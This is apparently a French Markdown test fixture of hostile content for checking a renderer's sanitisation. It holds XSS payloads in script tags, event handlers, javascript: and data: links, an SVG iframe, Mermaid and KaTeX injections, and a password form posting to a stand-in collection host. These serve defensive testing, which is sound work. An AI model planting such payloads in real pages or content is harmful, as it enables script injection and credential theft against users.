# Contenu hostile (test de sécurité, exemple)

Texte avant. <script>alert('xss-script')</script> texte après.

<img src="https://tracker.invalid/p.gif" onerror="alert('xss-img')">

<div onmouseover="alert('xss-div')" style="position:fixed;top:0;left:0;width:100%;height:100%">survol</div>

Lien piégé : [clique ici](javascript:alert('xss-link')) et [autre](JaVaScRiPt:alert(1)).

Lien data : [data](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==).

Image Markdown : ![logo](https://tracker.invalid/logo.png "logo").

SVG brut :

<svg xmlns="http://www.w3.org/2000/svg" width="200" height="50">
  <foreignObject width="200" height="50">
    <iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert('xss-svg')"></iframe>
  </foreignObject>
</svg>

<form action="https://collect.invalid/post"><input name="pwd" type="password"><button>Valider</button></form>

Bloc Mermaid avec configuration dangereuse :

```mermaid
%%{init: {"securityLevel":"loose"}}%%
flowchart LR
    A["<img src=x onerror=alert(1)>"] --> B[Suite]
    click A "javascript:alert('xss-click')"
    classDef x fill:url(http://evil.invalid/p.svg)
    class A x
```

Formule KaTeX piégée : $\href{javascript:alert('xss-katex')}{\text{cliquer}}$ et $\htmlId{x}{y}$.

Lien `mailto:` valide : [contact](mailto:support@example.org).
Lien HTTP normal : [site](http://example.org/page?x=1).

Fin du contenu hostile.
